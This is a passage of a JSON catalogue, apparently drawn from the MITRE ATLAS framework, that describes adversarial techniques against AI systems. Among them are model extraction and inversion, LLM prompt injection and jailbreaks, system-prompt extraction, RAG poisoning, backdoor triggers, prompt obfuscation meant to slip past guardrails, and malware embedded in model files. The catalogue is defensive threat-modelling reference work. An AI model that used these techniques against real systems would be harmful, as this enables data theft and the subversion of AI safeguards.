      "description": "Adversaries may exfiltrate private information via [AI Model Inference API Access](/techniques/AML.T0040).\nAI Models have been shown leak private information about their training data (e.g.  [Infer Training Data Membership](/techniques/AML.T0024.000), [Invert AI Model](/techniques/AML.T0024.001)).\nThe model itself may also be extracted ([Extract AI Model](/techniques/AML.T0024.002)) for the purposes of [AI Intellectual Property Theft](/techniques/AML.T0048.004).\n\nExfiltration of information relating to private training data raises privacy concerns.\nPrivate training data may include personally identifiable information, or other protected data.",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0024.000",
      "name": "Infer Training Data Membership",
      "description": "Adversaries may infer the membership of a data sample or global characteristics of the data in its training set, which raises privacy concerns.\nSome strategies make use of a shadow model that could be obtained via [Train Proxy via Replication](/techniques/AML.T0005.001), others use statistics of model prediction scores.\n\nThis can cause the victim model to leak private information, such as PII of those in the training set or other forms of protected IP.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0024.001",
      "name": "Invert AI Model",
      "description": "AI models' training data could be reconstructed by exploiting the confidence scores that are available via an inference API.\nBy querying the inference API strategically, adversaries can back out potentially private information embedded within the training data.\nThis could lead to privacy violations if the attacker can reconstruct the data of sensitive features used in the algorithm.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0024.002",
      "name": "Extract AI Model",
      "description": "Adversaries may extract a functional copy of a private model.\nBy repeatedly querying the victim's [AI Model Inference API Access](/techniques/AML.T0040), the adversary can collect the target model's inferences into a dataset.\nThe inferences are used as labels for training a separate model offline that will mimic the behavior and performance of the target model.\n\nAdversaries may extract the model to avoid paying per query in an artificial-intelligence-as-a-service (AIaaS) setting.\nModel extraction is used for [AI Intellectual Property Theft](/techniques/AML.T0048.004).",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0025",
      "name": "Exfiltration via Cyber Means",
      "description": "Adversaries may exfiltrate AI artifacts or other information relevant to their goals via traditional cyber means.\n\nSee the ATT&CK [Exfiltration](https://attack.mitre.org/tactics/TA0010/) tactic for more information.",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0029",
      "name": "Denial of AI Service",
      "description": "Adversaries may target AI-enabled systems with a flood of requests for the purpose of degrading or shutting down the service.\nSince many AI systems require significant amounts of specialized compute, they are often expensive bottlenecks that can become overloaded.\nAdversaries can intentionally craft inputs that require heavy amounts of useless compute from the AI system.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0046",
      "name": "Spamming AI System with Chaff Data",
      "description": "Adversaries may spam the AI system with chaff data that causes increase in the number of detections.\nThis can cause analysts at the victim organization to waste time reviewing and correcting incorrect inferences.\n\nAdversaries may also spam AI agents with excessive low-severity auditable events or agentic actions that require a human-in-the-loop, wasting time for the victim organization in human review of the agentic AI system.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0031",
      "name": "Erode AI Model Integrity",
      "description": "Adversaries may degrade the target model's performance with adversarial data inputs to erode confidence in the system over time.\nThis can lead to the victim organization wasting time and money both attempting to fix the system and performing the tasks it was meant to automate by hand.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0034",
      "name": "Cost Harvesting",
      "description": "Adversaries may target different AI services to send useless queries or computationally expensive inputs to increase the cost of running services at the victim organization.\nSponge examples are a particular type of adversarial data designed to maximize energy consumption and thus operating cost.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0035",
      "name": "AI Artifact Collection",
      "description": "Adversaries may collect AI artifacts for [Exfiltration](/tactics/AML.TA0010) or for use in [AI Attack Staging](/tactics/AML.TA0001).\nAI artifacts include models and datasets as well as other telemetry data produced when interacting with a model.",
      "tactic": "",
      "type": "technique",
      "severity": "medium"
    },
    {
      "id": "AML.T0036",
      "name": "Data from Information Repositories",
      "description": "Adversaries may leverage information repositories to mine valuable information.\nInformation repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.\n\nInformation stored in a repository may vary based on the specific instance or environment.\nSpecific common information repositories include SharePoint, Confluence, and enterprise databases such as SQL Server.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0037",
      "name": "Data from Local System",
      "description": "Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nThis can include basic fingerprinting information and sensitive data such as ssh keys.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0042",
      "name": "Verify Attack",
      "description": "Adversaries can verify the efficacy of their attack via an inference API or access to an offline copy of the target model.\nThis gives the adversary confidence that their approach works and allows them to carry out the attack at a later time of their choosing.\nThe adversary may verify the attack once but use it against many edge devices running copies of the target model.\nThe adversary may verify their attack digitally, then deploy it in the [Physical Environment Access](/techniques/AML.T0041) at a later time.\nVerifying the attack may be hard to detect since the adversary can use a minimal number of queries or an offline copy of the model.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0043",
      "name": "Craft Adversarial Data",
      "description": "Adversarial data are inputs to an AI model that have been modified such that they cause the adversary's desired effect in the target model.\nEffects can range from misclassification, to missed detections, to maximizing energy consumption.\nTypically, the modification is constrained in magnitude or location so that a human still perceives the data as if it were unmodified, but human perceptibility may not always be a concern depending on the adversary's intended effect.\nFor example, an adversarial input for an image classification task is an image the AI model would misclassify, but a human would still recognize as containing the correct class.\n\nDepending on the adversary's knowledge of and access to the target model, the adversary may use different classes of algorithms to develop the adversarial example such as [White-Box Optimization](/techniques/AML.T0043.000), [Black-Box Optimization](/techniques/AML.T0043.001), [Black-Box Transfer](/techniques/AML.T0043.002), or [Manual Modification](/techniques/AML.T0043.003).\n\nThe adversary may [Verify Attack](/techniques/AML.T0042) their approach works if they have white-box or inference API access to the model.\nThis allows the adversary to gain confidence their attack is effective \"live\" environment where their attack may be noticed.\nThey can then use the attack at a later time to accomplish their goals.\nAn adversary may optimize adversarial examples for [Evade AI Model](/techniques/AML.T0015), or to [Erode AI Model Integrity](/techniques/AML.T0031).",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0043.000",
      "name": "White-Box Optimization",
      "description": "In White-Box Optimization, the adversary has full access to the target model and optimizes the adversarial example directly.\nAdversarial examples trained in this manner are most effective against the target model.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0043.001",
      "name": "Black-Box Optimization",
      "description": "In Black-Box attacks, the adversary has black-box (i.e. [AI Model Inference API Access](/techniques/AML.T0040) via API access) access to the target model.\nWith black-box attacks, the adversary may be using an API that the victim is monitoring.\nThese attacks are generally less effective and require more inferences than [White-Box Optimization](/techniques/AML.T0043.000) attacks, but they require much less access.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0043.002",
      "name": "Black-Box Transfer",
      "description": "In Black-Box Transfer attacks, the adversary uses one or more proxy models (trained via [Create Proxy AI Model](/techniques/AML.T0005) or [Train Proxy via Replication](/techniques/AML.T0005.001)) they have full access to and are representative of the target model.\nThe adversary uses [White-Box Optimization](/techniques/AML.T0043.000) on the proxy models to generate adversarial examples.\nIf the set of proxy models are close enough to the target model, the adversarial example should generalize from one to another.\nThis means that an attack that works for the proxy models will likely then work for the target model.\nIf the adversary has [AI Model Inference API Access](/techniques/AML.T0040), they may use [Verify Attack](/techniques/AML.T0042) to confirm the attack is working and incorporate that information into their training process.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0043.003",
      "name": "Manual Modification",
      "description": "Adversaries may manually modify the input data to craft adversarial data.\nThey may use their knowledge of the target model to modify parts of the data they suspect helps the model in performing its task.\nThe adversary may use trial and error until they are able to verify they have a working adversarial input.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0043.004",
      "name": "Insert Backdoor Trigger",
      "description": "The adversary may add a perceptual trigger into inference data.\nThe trigger may be imperceptible or non-obvious to humans.\nThis technique is used in conjunction with [Poison AI Model](/techniques/AML.T0018.000) and allows the adversary to produce their desired effect in the target model.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0048",
      "name": "External Harms",
      "description": "Adversaries may abuse their access to a victim system and use its resources or capabilities to further their goals by causing harms external to that system.\nThese harms could affect the organization (e.g. Financial Harm, Reputational Harm), its users (e.g. User Harm), or the general public (e.g. Societal Harm).\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0048.000",
      "name": "Financial Harm",
      "description": "Financial harm involves the loss of wealth, property, or other monetary assets due to theft, fraud or forgery, or pressure to provide financial resources to the adversary.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0048.001",
      "name": "Reputational Harm",
      "description": "Reputational harm involves a degradation of public perception and trust in organizations.  Examples of reputation-harming incidents include scandals or false impersonations.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0048.002",
      "name": "Societal Harm",
      "description": "Societal harms might generate harmful outcomes that reach either the general public or specific vulnerable groups such as the exposure of children to vulgar content.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0048.003",
      "name": "User Harm",
      "description": "User harms may encompass a variety of harm types including financial and reputational that are directed at or felt by individual victims of the attack rather than at the organization level.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0048.004",
      "name": "AI Intellectual Property Theft",
      "description": "Adversaries may exfiltrate AI artifacts to steal intellectual property and cause economic harm to the victim organization.\n\nProprietary training data is costly to collect and annotate and may be a target for [Exfiltration](/tactics/AML.TA0010) and theft.\n\nAIaaS providers charge for use of their API.\nAn adversary who has stolen a model via [Exfiltration](/tactics/AML.TA0010) or via [Extract AI Model](/techniques/AML.T0024.002) now has unlimited use of that service without paying the owner of the intellectual property.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0049",
      "name": "Exploit Public-Facing Application",
      "description": "Adversaries may attempt to take advantage of a weakness in an Internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. The weakness in the system can be a bug, a glitch, or a design vulnerability. These applications are often websites, but can include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other applications with Internet accessible open sockets, such as web servers and related services.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0050",
      "name": "Command and Scripting Interpreter",
      "description": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.\n\nThere are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic.\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0051",
      "name": "LLM Prompt Injection",
      "description": "An adversary may craft malicious prompts as inputs to an LLM that cause the LLM to act in unintended ways.\nThese \"prompt injections\" are often designed to cause the model to ignore aspects of its original instructions and follow the adversary's instructions instead.\n\nPrompt Injections can be an initial access vector to the LLM that provides the adversary with a foothold to carry out other steps in their operation.\nThey may be designed to bypass defenses in the LLM, or allow the adversary to issue privileged commands.\nThe effects of a prompt injection can persist throughout an interactive session with an LLM.\n\nMalicious prompts may be injected directly by the adversary ([Direct](/techniques/AML.T0051.000)) either to leverage the LLM to generate harmful content or to gain a foothold on the system and lead to further effects.\nPrompts may also be injected indirectly when as part of its normal operation the LLM ingests the malicious prompt from another data source ([Indirect](/techniques/AML.T0051.001)). This type of injection can be used by the adversary to a foothold on the system or to target the user of the LLM.\nMalicious prompts may also be [Triggered](/techniques/AML.T0051.002) user actions or system events.",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0051.000",
      "name": "Direct",
      "description": "An adversary may inject prompts directly as a user of the LLM. This type of injection may be used by the adversary to gain a foothold in the system or to misuse the LLM itself, as for example to generate harmful content.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0051.001",
      "name": "Indirect",
      "description": "An adversary may inject prompts indirectly via separate data channel ingested by the LLM such as include text or multimedia pulled from databases or websites.\nThese malicious prompts may be hidden or obfuscated from the user. This type of injection may be used by the adversary to gain a foothold in the system or to target an unwitting user of the system.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0052",
      "name": "Phishing",
      "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.\n\nGenerative AI, including LLMs that generate synthetic text, visual deepfakes of faces, and audio deepfakes of speech, is enabling adversaries to scale targeted phishing campaigns. LLMs can interact with users via text conversations and can be programmed with a meta prompt to phish for sensitive information. Deepfakes can be use in impersonation as an aid to phishing.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0052.000",
      "name": "Spearphishing via Social Engineering LLM",
      "description": "Adversaries may turn LLMs into targeted social engineers.\nLLMs are capable of interacting with users via text conversations.\nThey can be instructed by an adversary to seek sensitive information from a user and act as effective social engineers.\nThey can be targeted towards particular personas defined by the adversary.\nThis allows adversaries to scale spearphishing efforts and target individuals to reveal private information such as credentials to privileged systems.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0053",
      "name": "AI Agent Tool Invocation",
      "description": "Adversaries may use their access to an AI agent to invoke tools the agent has access to. LLMs are often connected to other services or resources via tools to increase their capabilities. Tools may include integrations with other applications, access to public or private data sources, and the ability to execute code.\n\nThis may allow adversaries to execute API calls to integrated applications or services, providing the adversary with increased privileges on the system. Adversaries may take advantage of connected data sources to retrieve sensitive information. They may also use an LLM integrated with a command or script interpreter to execute arbitrary instructions.\n\nAI agents may be configured to have access to tools that are not directly accessible by users. Adversaries may abuse this to gain access to tools they otherwise wouldn't be able to use.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0054",
      "name": "LLM Jailbreak",
      "description": "An adversary may use a carefully crafted [LLM Prompt Injection](/techniques/AML.T0051) designed to place LLM in a state in which it will freely respond to any user input, bypassing any controls, restrictions, or guardrails placed on the LLM.\nOnce successfully jailbroken, the LLM can be used in unintended ways by the adversary.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0055",
      "name": "Unsecured Credentials",
      "description": "Adversaries may search compromised systems to find and obtain insecurely stored credentials.\nThese credentials can be stored and/or misplaced in many locations on a system, including plaintext files (e.g. bash history), environment variables, operating system, or application-specific repositories (e.g. Credentials in Registry), or other specialized files/artifacts (e.g. private keys).\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0056",
      "name": "Extract LLM System Prompt",
      "description": "Adversaries may attempt to extract a large language model's (LLM) system prompt. This can be done via prompt injection to induce the model to reveal its own system prompt or may be extracted from a configuration file.\n\nSystem prompts can be a portion of an AI provider's competitive advantage and are thus valuable intellectual property that may be targeted by adversaries.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0057",
      "name": "LLM Data Leakage",
      "description": "Adversaries may craft prompts that induce the LLM to leak sensitive information.\nThis can include private user data or proprietary information.\nThe leaked information may come from proprietary training data, data sources the LLM is connected to, or information from other users of the LLM.\n",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0058",
      "name": "Publish Poisoned Models",
      "description": "Adversaries may publish a poisoned model to a public location such as a model registry or code repository. The poisoned model may be a novel model or a poisoned variant of an existing open-source model. This model may be introduced to a victim system via [AI Supply Chain Compromise](/techniques/AML.T0010).",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0059",
      "name": "Erode Dataset Integrity",
      "description": "Adversaries may poison or manipulate portions of a dataset to reduce its usefulness, reduce trust, and cause users to waste resources correcting errors.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0011.001",
      "name": "Malicious Package",
      "description": "Adversaries may develop malicious software packages that when imported by a user have a deleterious effect.\nMalicious packages may behave as expected to the user. They may be introduced via [AI Supply Chain Compromise](/techniques/AML.T0010). They may not present as obviously malicious to the user and may appear to be useful for an AI-related task.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0060",
      "name": "Publish Hallucinated Entities",
      "description": "Adversaries may create an entity they control, such as a software package, website, or email address to a source hallucinated by an LLM. The hallucinations may take the form of package names commands, URLs, company names, or email addresses that point the victim to the entity controlled by the adversary. When the victim interacts with the adversary-controlled entity, the attack can proceed.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0061",
      "name": "LLM Prompt Self-Replication",
      "description": "An adversary may use a carefully crafted [LLM Prompt Injection](/techniques/AML.T0051) designed to cause the LLM to replicate the prompt as part of its output. This allows the prompt to propagate to other LLMs and persist on the system. The self-replicating prompt is typically paired with other malicious instructions (ex: [LLM Jailbreak](/techniques/AML.T0054), [LLM Data Leakage](/techniques/AML.T0057)).",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0062",
      "name": "Discover LLM Hallucinations",
      "description": "Adversaries may prompt large language models and identify hallucinated entities.\nThey may request software packages, commands, URLs, organization names, or e-mail addresses, and identify hallucinations with no connected real-world source. Discovered hallucinations provide the adversary with potential targets to [Publish Hallucinated Entities](/techniques/AML.T0060). Different LLMs have been shown to produce the same hallucinations, so the hallucinations exploited by an adversary may affect users of other LLMs.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0008.002",
      "name": "Domains",
      "description": "Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.\n\nAdversaries may use acquired domains for a variety of purposes (see [ATT&CK](https://attack.mitre.org/techniques/T1583/001/)). Large AI datasets are often distributed as a list of URLs to individual datapoints. Adversaries may acquire expired domains that are included in these datasets and replace individual datapoints with poisoned examples ([Publish Poisoned Datasets](/techniques/AML.T0019)).",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0008.003",
      "name": "Physical Countermeasures",
      "description": "Adversaries may acquire or manufacture physical countermeasures to aid or support their attack.\n\nThese components may be used to disrupt or degrade the model, such as adversarial patterns printed on stickers or T-shirts, disguises, or decoys. They may also be used to disrupt or degrade the sensors used in capturing data, such as laser pointers, light bulbs, or other tools.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0063",
      "name": "Discover AI Model Outputs",
      "description": "Adversaries may discover model outputs, such as class scores, whose presence is not required for the system to function and are not intended for use by the end user. Model outputs may be found in logs or may be included in API responses.\nModel outputs may enable the adversary to identify weaknesses in the model and develop attacks.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0016.002",
      "name": "Generative AI",
      "description": "Adversaries may search for and obtain generative AI models or tools, such as large language models (LLMs), to assist them in various steps of their operation. Generative AI can be used in a variety of malicious ways, such as to generating malware, to [Generate Deepfakes](/techniques/AML.T0088), to [Generate Malicious Commands](/techniques/AML.T0102), for [Retrieval Content Crafting](/techniques/AML.T0066), or to generate [Phishing](/techniques/AML.T0052) content.\n\nAdversaries may obtain open source models and serve them locally using frameworks such as [Ollama](https://ollama.com/) or [vLLM]( https://docs.vllm.ai/en/latest/). They may host them using cloud infrastructure. Or, they may leverage AI service providers such as HuggingFace.\n\nThey may need to jailbreak the model (see [LLM Jailbreak](/techniques/AML.T0054)) to bypass any restrictions put in place to limit the types of responses it can generate. They may also need to break the terms of service of the model's developer.\n\nGenerative AI models may also be \"uncensored\" meaning they are designed to generate content without any restrictions such as guardrails or content filters. Uncensored GenAI is ripe for abuse by cybercriminals [\\[1\\]][1] [\\[2\\]][2]. Models may be fine-tuned to remove alignment and guardrails [\\[3\\]][3] or be subjected to targeted manipulations to bypass refusal [\\[4\\]][4] resulting in uncensored variants of the model. Uncensored models may be built for offensive and defensive cybersecurity [\\[5\\]][5], which can be abused by an adversary. There are also models that are expressly designed and advertised for malicious use [\\[6\\]][6].\n\n[1]: https://blog.talosintelligence.com/cybercriminal-abuse-of-large-language-models/\n[2]: https://gbhackers.com/cybercriminals-exploit-llm-models/\n[3]: https://erichartford.com/uncensored-models\n[4]: https://arxiv.org/abs/2406.11717/\n[5]: https://taico.ca/posts/whiterabbitneo/\n[6]: https://gbhackers.com/wormgpt-enhanced-with-grok-and-mixtral/",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0064",
      "name": "Gather RAG-Indexed Targets",
      "description": "Adversaries may identify data sources used in retrieval augmented generation (RAG) systems for targeting purposes. By pinpointing these sources, attackers can focus on poisoning or otherwise manipulating the external data repositories the AI relies on.\n\nRAG-indexed data may be identified in public documentation about the system, or by interacting with the system directly and observing any indications of or references to external data sources.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0065",
      "name": "LLM Prompt Crafting",
      "description": "Adversaries may use their acquired knowledge of the target generative AI system to craft prompts that bypass its defenses and allow malicious instructions to be executed.\n\nThe adversary may iterate on the prompt to ensure that it works as-intended consistently.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0066",
      "name": "Retrieval Content Crafting",
      "description": "Adversaries may write content designed to be retrieved by user queries and influence a user of the system in some way. This abuses the trust the user has in the system.\n\nThe crafted content can be combined with a prompt injection. It can also stand alone in a separate document or email. The adversary must get the crafted content into the victim\\u0027s database, such as a vector database used in a retrieval augmented generation (RAG) system. This may be accomplished via cyber access, or by abusing the ingestion mechanisms common in RAG systems (see [RAG Poisoning](/techniques/AML.T0070)).\n\nLarge language models may be used as an assistant to aid an adversary in crafting content.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0067",
      "name": "LLM Trusted Output Components Manipulation",
      "description": "Adversaries may utilize prompts to a large language model (LLM) which manipulate various components of its response in order to make it appear trustworthy to the user. This helps the adversary continue to operate in the victim's environment and evade detection by the users it interacts with.\n\nThe LLM may be instructed to tailor its language to appear more trustworthy to the user or attempt to manipulate the user to take certain actions. Other response components that could be manipulated include links, recommended follow-up actions, retrieved document metadata, and [Citations](/techniques/AML.T0067.000).",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0068",
      "name": "LLM Prompt Obfuscation",
      "description": "Adversaries may hide or otherwise obfuscate prompt injections or retrieval content to avoid detection from humans, large language model (LLM) guardrails, or other detection mechanisms.\n\nFor text inputs, this may include modifying how the instructions are rendered such as small text, text colored the same as the background, or hidden HTML elements. For multi-modal inputs, malicious instructions could be hidden in the data itself (e.g. in the pixels of an image) or in file metadata (e.g. EXIF for images, ID3 tags for audio, or document metadata).\n\nInputs can also be obscured via an encoding scheme such as base64 or rot13. This may bypass LLM guardrails that identify malicious content and may not be as easily identifiable as malicious to a human in the loop.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0069",
      "name": "Discover LLM System Information",
      "description": "The adversary is trying to discover something about the large language model's (LLM) system information. This may be found in a configuration file containing the system instructions or extracted via interactions with the LLM. The desired information may include the full system prompt, special characters that have significance to the LLM or keywords indicating functionality available to the LLM. Information about how the LLM is instructed can be used by the adversary to understand the system's capabilities and to aid them in crafting malicious prompts.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0069.000",
      "name": "Special Character Sets",
      "description": "Adversaries may discover delimiters and special characters sets used by the large language model. For example, delimiters used in retrieval augmented generation applications to differentiate between context and user prompts. These can later be exploited to confuse or manipulate the large language model into misbehaving.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0069.001",
      "name": "System Instruction Keywords",
      "description": "Adversaries may discover keywords that have special meaning to the large language model (LLM), such as function names or object names. These can later be exploited to confuse or manipulate the LLM into misbehaving and to make calls to plugins the LLM has access to.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0069.002",
      "name": "System Prompt",
      "description": "Adversaries may discover a large language model's system instructions provided by the AI system builder to learn about the system's capabilities and circumvent its guardrails.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0070",
      "name": "RAG Poisoning",
      "description": "Adversaries may inject malicious content into data indexed by a retrieval augmented generation (RAG) system to contaminate a future thread through RAG-based search results. This may be accomplished by placing manipulated documents in a location the RAG indexes (see [Gather RAG-Indexed Targets](/techniques/AML.T0064)).\n\nThe content may be targeted such that it would always surface as a search result for a specific user query. The adversary's content may include false or misleading information. It may also include prompt injections with malicious instructions, or false RAG entries.",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0071",
      "name": "False RAG Entry Injection",
      "description": "Adversaries may introduce false entries into a victim's retrieval augmented generation (RAG) database. Content designed to be interpreted as a document by the large language model (LLM) used in the RAG system is included in a data source being ingested into the RAG database. When RAG entry including the false document is retrieved, the LLM is tricked into treating part of the retrieved content as a false RAG result. \n\nBy including a false RAG document inside of a regular RAG entry, it bypasses data monitoring tools. It also prevents the document from being deleted directly. \n\nThe adversary may use discovered system keywords to learn how to instruct a particular LLM to treat content as a RAG entry. They may be able to manipulate the injected entry's metadata including document title, author, and creation date.",
      "tactic": "",
      "type": "technique",
      "severity": "high"
    },
    {
      "id": "AML.T0067.000",
      "name": "Citations",
      "description": "Adversaries may manipulate the citations provided in an AI system's response, in order to make it appear trustworthy. Variants include citing a providing the wrong citation, making up a new citation, or providing the right citation but for adversary-provided data.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0018.002",
      "name": "Embed Malware",
      "description": "Adversaries may embed malicious code into AI Model files.\nAI models may be packaged as a combination of instructions and weights.\nSome formats such as pickle files are unsafe to deserialize because they can contain unsafe calls such as exec.\nModels with embedded malware may still operate as expected.\nIt may allow them to achieve Execution, Command & Control, or Exfiltrate Data.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0010.004",
      "name": "Container Registry",
      "description": "An adversary may compromise a victim's container registry by pushing a manipulated container image and overwriting an existing container name and/or tag. Users of the container registry as well as automated CI/CD pipelines may pull the adversary's container image, compromising their AI Supply Chain. This can affect development and deployment environments.\n\nContainer images may include AI models, so the compromised image could have an AI model which was manipulated by the adversary (See [Manipulate AI Model](/techniques/AML.T0018)).",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0072",
      "name": "Reverse Shell",
      "description": "Adversaries may utilize a reverse shell to communicate and control the victim system.\n\nTypically, a user uses a client to connect to a remote machine which is listening for connections. With a reverse shell, the adversary is listening for incoming connections initiated from the victim system.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0073",
      "name": "Impersonation",
      "description": "Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing](/techniques/AML.T0052), or [Spearphishing via Social Engineering LLM](/techniques/AML.T0052.000)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary's ultimate goals, possibly against multiple victims.\n\nAdversaries may target resources that are part of the AI DevOps lifecycle, such as model repositories, container registries, and software registries.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0074",
      "name": "Masquerading",
      "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.",
      "tactic": "",
      "type": "technique",
      "severity": "low"
    },
    {
      "id": "AML.T0075",
      "name": "Cloud Service Discovery",
      "description": "Adversaries may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), software-as-a-service (SaaS), or AI-as-a-service (AIaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, AI Inference, Generative AI, Agentic AI, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.\n\nAdversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity. They may use tools to check credentials and enumerate the AI models available in various AIaaS providers' environments including AI21 Labs, Anthropic, AWS Bedrock, Azure, ElevenLabs, MakerSuite, Mistral, OpenAI, OpenRouter, and GCP Vertex AI [\\[1\\]][1].\n\n[1]: https://www.sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack",
      "tactic": "",
      "type": "technique",
      "severity": "medium"
    },
    {
      "id": "AML.T0076",
